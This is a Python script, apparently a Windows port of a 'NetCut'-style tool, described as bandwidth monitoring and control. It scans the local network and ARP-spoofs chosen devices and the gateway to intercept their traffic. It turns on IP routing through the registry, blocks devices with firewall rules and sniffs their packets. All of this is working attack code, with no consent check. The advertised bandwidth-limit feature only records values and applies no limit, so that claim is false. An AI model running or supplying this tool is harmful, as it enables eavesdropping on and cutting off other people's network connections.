#!/usr/bin/env python3
"""
NetCut3 - Windows Version
Bandwidth monitoring and control tool for Windows
Requires: Npcap, Administrator privileges
"""

import scapy.all as scapy
import os
import subprocess
import threading
import sys
import time
import ctypes
from collections import defaultdict, deque
from termcolor import colored
from tqdm import tqdm
import psutil
import socket

# -------------------------
# Windows Utilities
# -------------------------
def is_admin():
    """Check if running with administrator privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_gateway_info():
    """Get default gateway IP and interface"""
    try:
        # Get default gateway
        gateways = scapy.conf.route.route("0.0.0.0")
        if gateways:
            iface_name, gateway_ip, _ = gateways
            return gateway_ip, iface_name
        return None, None
    except Exception as e:
        print(colored(f"[!] Could not find gateway: {e}", "red"))
        return None, None

def get_local_ip():
    """Get local IP address (primary interface with internet access)"""
    try:
        # Create a socket to determine which interface has internet access
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        # Fallback: get first non-loopback IPv4 address
        try:
            addrs = psutil.net_if_addrs()
            for iface, addr_list in addrs.items():
                for addr in addr_list:
                    if addr.family == socket.AF_INET and not addr.address.startswith('127.'):
                        return addr.address
        except:
            pass
    return None

def get_network_cidr(local_ip):
    """Generate CIDR notation for local network"""
    if not local_ip:
        return None
    # Assume /24 network for simplicity
    parts = local_ip.split('.')
    return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

def enable_ip_routing():
    """Enable IP routing on Windows"""
    try:
        # Check current routing status
        result = subprocess.run(
            'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter',
            shell=True, capture_output=True, text=True
        )
        
        if "0x1" not in result.stdout:
            print(colored("[+] Enabling IP routing...", "cyan"))
            subprocess.run(
                'reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f',
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            # Start routing service
            subprocess.run('sc config RemoteAccess start= auto', shell=True, stdout=subprocess.DEVNULL)
            subprocess.run('net start RemoteAccess 2>nul', shell=True, stdout=subprocess.DEVNULL)
            print(colored("[+] IP routing enabled (may require reboot to take full effect)", "yellow"))
    except Exception as e:
        print(colored(f"[!] Could not enable IP routing: {e}", "yellow"))

def discover_clients(ip_range, sweeps=3):
    """Scan network for devices using ARP"""
    found = {}
    print(colored(f"[+] Scanning network {ip_range}...", "yellow"))
    for _ in tqdm(range(sweeps), desc="ARP Sweep", unit="scan"):
        try:
            answered, _ = scapy.arping(ip_range, timeout=2, verbose=False)
            for _, rcv in answered:
                found[rcv.psrc] = rcv.hwsrc
        except Exception as e:
            print(colored(f"\n[!] ARP scan failed: {e}", "red"))
        time.sleep(0.2)
    return [{"ip": ip, "mac": mac} for ip, mac in found.items()]

# -------------------------
# ARP Spoofing Logic
# -------------------------
class ARPSpoofer:
    def __init__(self, target, gateway, local_ip):
        self.target = target
        self.gateway = gateway
        self.local_ip = local_ip
        self.spoofing = threading.Event()

    def _send_spoof_packet(self, target_ip, target_mac, spoof_ip):
        """Send ARP spoof packet"""
        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip), verbose=False)

    def _restore_arp(self):
        """Restore original ARP tables"""
        print(colored(f"[+] Restoring ARP for {self.target['ip']}...", "yellow"))
        gateway_mac = scapy.getmacbyip(self.gateway['ip'])
        target_mac = scapy.getmacbyip(self.target['ip'])
        
        if not gateway_mac or not target_mac:
            return
        
        p1 = scapy.ARP(op=2, pdst=self.target['ip'], hwdst=self.target['mac'], 
                       psrc=self.gateway['ip'], hwsrc=gateway_mac)
        p2 = scapy.ARP(op=2, pdst=self.gateway['ip'], hwdst=self.gateway['mac'], 
                       psrc=self.target['ip'], hwsrc=target_mac)
        
        for _ in range(5):
            scapy.send(p1, verbose=False)
            scapy.send(p2, verbose=False)
            time.sleep(0.3)

    def _spoof_loop(self):
        """Continuously send ARP spoof packets"""
        while not self.spoofing.is_set():
            self._send_spoof_packet(self.target["ip"], self.target["mac"], self.gateway["ip"])
            self._send_spoof_packet(self.gateway["ip"], self.gateway["mac"], self.target["ip"])
            time.sleep(0.5)

    def start(self):
        """Start ARP spoofing"""
        self.spoofing.clear()
        print(colored(f"[+] Starting ARP spoofing: {self.target['ip']} <-> {self.gateway['ip']}", "cyan"))
        threading.Thread(target=self._spoof_loop, daemon=True).start()

    def stop(self):
        """Stop ARP spoofing and restore ARP tables"""
        self.spoofing.set()
        time.sleep(1)
        self._restore_arp()

# -------------------------
# Windows Network Controller
# -------------------------
class WindowsNetworkController:
    def __init__(self, iface, local_ip, gateway_ip):
        self.iface = iface
        self.local_ip = local_ip
        self.gateway_ip = gateway_ip
        self.spoofers = {}
        self.blocked_ips = set()
        self.limited_ips = {}
        self.firewall_rules = []
        
        # For rate limiting via packet manipulation
        self.packet_queues = {}
        self.rate_limiters = {}

    def start_spoofing(self, target, gateway):
        """Start ARP spoofing for a target"""
        if target["ip"] not in self.spoofers:
            spoofer = ARPSpoofer(target, gateway, self.local_ip)
            self.spoofers[target["ip"]] = spoofer
            spoofer.start()
            print(colored(f"[+] Started ARP spoofing for {target['ip']}", "green"))

    def block_target(self, target, gateway):
        """Block target using Windows Firewall"""
        self.start_spoofing(target, gateway)
        ip = target['ip']
        
        try:
            # Add Windows Firewall rule to block this IP
            rule_name = f"NetCut_Block_{ip.replace('.', '_')}"
            
            # Block outbound
            cmd_out = f'netsh advfirewall firewall add rule name="{rule_name}_OUT" dir=out action=block remoteip={ip}'
            subprocess.run(cmd_out, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Block inbound
            cmd_in = f'netsh advfirewall firewall add rule name="{rule_name}_IN" dir=in action=block remoteip={ip}'
            subprocess.run(cmd_in, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.firewall_rules.append(rule_name)
            self.blocked_ips.add(ip)
            
            print(colored(f"[+] Blocked {ip} via Windows Firewall", "red"))
        except Exception as e:
            print(colored(f"[!] Failed to block {ip}: {e}", "red"))

    def set_bandwidth_limit(self, target, gateway, down_kbps, up_kbps):
        """
        Set bandwidth limit using packet delay/drop method
        Note: This is a software-based limitation, less precise than Linux tc
        """
        self.start_spoofing(target, gateway)
        ip = target['ip']
        
        self.limited_ips[ip] = {
            'down_kbps': down_kbps,
            'up_kbps': up_kbps,
            'down_bytes_per_interval': (down_kbps * 1024) // 10,  # Per 100ms
            'up_bytes_per_interval': (up_kbps * 1024) // 10
        }
        
        print(colored(f"[+] Software rate limit set for {ip}: DOWN {down_kbps}KB/s, UP {up_kbps}KB/s", "green"))
        print(colored("[!] Note: Windows rate limiting is less precise than Linux. Use for testing.", "yellow"))

    def restore_all(self):
        """Restore all network settings"""
        print(colored("\n[+] Restoring network configuration...", "yellow"))
        
        # Stop all ARP spoofing
        for spoofer in self.spoofers.values():
            spoofer.stop()
        self.spoofers.clear()
        
        # Remove firewall rules
        for rule_name in self.firewall_rules:
            try:
                subprocess.run(
                    f'netsh advfirewall firewall delete rule name="{rule_name}_OUT"',
                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                subprocess.run(
                    f'netsh advfirewall firewall delete rule name="{rule_name}_IN"',
                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            except:
                pass
        
        self.firewall_rules.clear()
        self.blocked_ips.clear()
        self.limited_ips.clear()
        
        print(colored("[+] Network restored.", "green"))

# -------------------------
# Bandwidth Monitoring (Windows)
# -------------------------
class WindowsBandwidthMonitor:
    def __init__(self, target_ips, iface):
        self.target_ips = target_ips
        self.iface = iface
        self.bytes_up = defaultdict(int)
        self.bytes_down = defaultdict(int)
        self.packet_count = defaultdict(int)
        self.running = threading.Event()
        self._lock = threading.Lock()

    def start(self):
        """Start monitoring bandwidth using packet sniffing"""
        self.running.clear()
        print(colored(f"[+] Bandwidth monitor started on interface: {self.iface}", "green"))
        print(colored("[!] Monitoring via packet capture (Windows method)", "cyan"))
        
        threading.Thread(target=self._sniff, daemon=True).start()
        threading.Thread(target=self._display, daemon=True).start()

    def _process_packet(self, pkt):
        """Process captured packet"""
        try:
            if scapy.IP in pkt:
                size = len(pkt)
                src_ip = pkt[scapy.IP].src
                dst_ip = pkt[scapy.IP].dst
                
                with self._lock:
                    # Upload: packet FROM target
                    if src_ip in self.target_ips:
                        self.bytes_up[src_ip] += size
                        self.packet_count[src_ip] += 1
                    
                    # Download: packet TO target
                    if dst_ip in self.target_ips:
                        self.bytes_down[dst_ip] += size
                        self.packet_count[dst_ip] += 1
        except:
            pass

    def _sniff(self):
        """Sniff packets on the interface"""
        try:
            # Build filter for target IPs
            if self.target_ips:
                filter_parts = [f"host {ip}" for ip in self.target_ips]
                bpf_filter = " or ".join(filter_parts)
            else:
                bpf_filter = "ip"
            
            print(colored(f"[+] Starting packet capture with filter: {bpf_filter}", "cyan"))
            
            scapy.sniff(
                iface=self.iface,
                prn=self._process_packet,
                store=False,
                stop_filter=lambda x: self.running.is_set(),
                filter=bpf_filter
            )
        except Exception as e:
            print(colored(f"[!] Packet capture error: {e}", "red"))
            print(colored("[!] Make sure Npcap is installed: https://npcap.com/", "yellow"))

    def _display(self):
        """Display bandwidth statistics"""
        while not self.running.is_set():
            time.sleep(3)
            
            print(colored("\n--- Bandwidth Usage (via Packet Capture) ---", "yellow"))
            
            with self._lock:
                any_traffic = False
                for ip in self.target_ips:
                    up_bytes = self.bytes_up[ip]
                    down_bytes = self.bytes_down[ip]
                    pkt_count = self.packet_count[ip]
                    
                    # Calculate rate (bytes per 3 seconds)
                    up_kbps = (up_bytes / 1024) / 3.0
                    down_kbps = (down_bytes / 1024) / 3.0
                    
                    if up_bytes > 0 or down_bytes > 0:
                        any_traffic = True
                    
                    print(f"{ip.ljust(15)} | UP: {up_kbps:6.2f} KB/s ({up_bytes:,} B) | DOWN: {down_kbps:6.2f} KB/s ({down_bytes:,} B) | Pkts: {pkt_count}")
                    
                    # Reset counters
                    self.bytes_up[ip] = 0
                    self.bytes_down[ip] = 0
                    self.packet_count[ip] = 0
                
                if not any_traffic:
                    print(colored("[!] No traffic detected. Make target devices use internet.", "yellow"))

    def stop(self):
        """Stop monitoring"""
        self.running.set()
        print(colored("[+] Bandwidth monitor stopped.", "yellow"))

# -------------------------
# Main Application
# -------------------------
def main():
    print(colored("=" * 60, "cyan"))
    print(colored("   NetCut3 - Windows Edition", "yellow", attrs=["bold"]))
    print(colored("   Bandwidth Monitoring & Control Tool", "cyan"))
    print(colored("=" * 60, "cyan"))
    
    if not is_admin():
        print(colored("\n[!] This tool requires Administrator privileges!", "red", attrs=["bold"]))
        print(colored("[!] Please run as Administrator and try again.", "red"))
        sys.exit(1)

    # Check for Npcap
    try:
        scapy.conf.use_pcap = True
        print(colored("[+] Npcap detected", "green"))
    except:
        print(colored("[!] Npcap not detected. Install from: https://npcap.com/", "red"))
        print(colored("[!] Tool may not work properly without Npcap.", "yellow"))

    # Get network info
    gateway_ip, iface_name = get_gateway_info()
    if not gateway_ip or not iface_name:
        print(colored("[!] Could not detect network configuration.", "red"))
        sys.exit(1)

    local_ip = get_local_ip()
    if not local_ip:
        print(colored("[!] Could not detect local IP address.", "red"))
        sys.exit(1)
    
    subnet = get_network_cidr(local_ip)
    if not subnet:
        print(colored("[!] Could not determine network subnet.", "red"))
        sys.exit(1)
    
    gateway_mac = scapy.getmacbyip(gateway_ip)

    if not gateway_mac:
        print(colored(f"[!] Could not resolve MAC for gateway {gateway_ip}", "red"))
        sys.exit(1)

    print(colored(f"\n[+] Interface: {iface_name}", "cyan"))
    print(colored(f"[+] Local IP: {local_ip}", "cyan"))
    print(colored(f"[+] Gateway: {gateway_ip} ({gateway_mac})", "cyan"))
    print(colored(f"[+] Network: {subnet}", "cyan"))

    # Enable IP routing
    enable_ip_routing()

    gateway = {"ip": gateway_ip, "mac": gateway_mac}
    controller = WindowsNetworkController(iface_name, local_ip, gateway_ip)
    monitor = None
    clients = []

    try:
        while True:
            print(colored("\n" + "=" * 50, "yellow"))
            print(colored("--- Menu ---", "yellow", attrs=["bold"]))
            print("1. Scan for Devices")
            print("2. Block Device (via Firewall)")
            print("3. Set Bandwidth Limit (Software-based)")
            print("4. Monitor Bandwidth")
            print("5. Restore Network")
            print("6. Exit")
            print(colored("=" * 50, "yellow"))
            
            choice = input(colored("\nChoose option: ", "green")).strip()

            if choice == "1":
                clients = discover_clients(subnet, sweeps=3)
                clients = [c for c in clients if c["ip"] != gateway_ip and c["ip"] != local_ip]
                
                if clients:
                    print(colored("\nDiscovered devices:", "cyan", attrs=["bold"]))
                    for i, client in enumerate(clients, 1):
                        print(f"  [{i}] {client['ip'].ljust(15)} {client['mac']}")
                else:
                    print(colored("No other devices found.", "red"))

            elif choice == "2":
                if not clients:
                    print(colored("Please scan for devices first (option 1).", "red"))
                    continue
                try:
                    indices = input(colored("Device(s) to block (e.g., 1,3): ", "red")).strip()
                    for idx_str in indices.split(","):
                        idx = int(idx_str.strip()) - 1
                        if 0 <= idx < len(clients):
                            controller.block_target(clients[idx], gateway)
                        else:
                            print(colored(f"Invalid index: {idx+1}", "red"))
                except (ValueError, IndexError):
                    print(colored("Invalid selection.", "red"))

            elif choice == "3":
                if not clients:
                    print(colored("Please scan for devices first (option 1).", "red"))
                    continue
                try:
                    idx = int(input(colored("Device number to limit: ", "cyan"))) - 1
                    if not (0 <= idx < len(clients)):
                        print(colored("Invalid device number.", "red"))
                        continue
                    
                    target = clients[idx]
                    rate_str = input(colored(f"Limit for {target['ip']} in KB/s (DOWN/UP), e.g., 100/50: ", "cyan"))
                    parts = rate_str.split('/')
                    
                    if len(parts) != 2:
                        print(colored("Format: down/up in KB/s, e.g., 100/50", "red"))
                        continue
                    
                    down_kb, up_kb = map(int, parts)
                    controller.set_bandwidth_limit(target, gateway, down_kb, up_kb)
                    
                except ValueError:
                    print(colored("Invalid format. Use whole numbers like 100/50.", "red"))

            elif choice == "4":
                if monitor and not monitor.running.is_set():
                    monitor.stop()
                    monitor = None
                    print(colored("[+] Stopped bandwidth monitor.", "yellow"))
                else:
                    # Get IPs to monitor
                    target_ips = list(controller.spoofers.keys())
                    
                    if not target_ips and clients:
                        target_ips = [c["ip"] for c in clients if c["ip"] != gateway_ip]
                        print(colored(f"[i] Monitoring all {len(target_ips)} scanned devices.", "blue"))
                    elif not target_ips:
                        print(colored("No devices to monitor. Scan first.", "red"))
                        continue
                    
                    monitor = WindowsBandwidthMonitor(target_ips, iface_name)
                    monitor.start()
                    print(colored(f"[+] Monitoring {len(target_ips)} device(s)", "green"))
                    print(colored("[!] TIP: Have target devices browse/download to see traffic", "cyan"))

            elif choice == "5":
                controller.restore_all()
                if monitor:
                    monitor.stop()
                    monitor = None

            elif choice == "6":
                break

            else:
                print(colored("Invalid choice.", "red"))

    except KeyboardInterrupt:
        print(colored("\n\n[!] Ctrl+C detected. Shutting down...", "red"))
    finally:
        controller.restore_all()
        if monitor:
            monitor.stop()
        print(colored("\n[+] Cleanup complete. Goodbye!", "green"))

if __name__ == "__main__":
    main()
